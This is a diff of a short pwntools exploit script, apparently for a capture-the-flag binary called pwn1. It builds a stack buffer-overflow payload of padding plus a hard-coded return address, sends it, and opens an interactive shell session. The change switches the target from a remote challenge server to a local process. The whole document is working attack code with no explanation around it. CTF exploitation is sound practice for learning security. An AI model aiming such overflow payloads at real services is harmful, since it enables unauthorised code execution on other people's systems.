@@ -11,8 +11,8 @@ eval_addr=0x00000000004011BB
 
 payload=b'A'*offset+p64(eval_addr)
 
-# sh=process(['./pwn1'])
-sh=remote("gz.imxbt.cn",20202)
+sh=process(['./pwn1'])
+# sh=remote("gz.imxbt.cn",20202)
 sh.sendline(payload)
 
 sh.interactive()
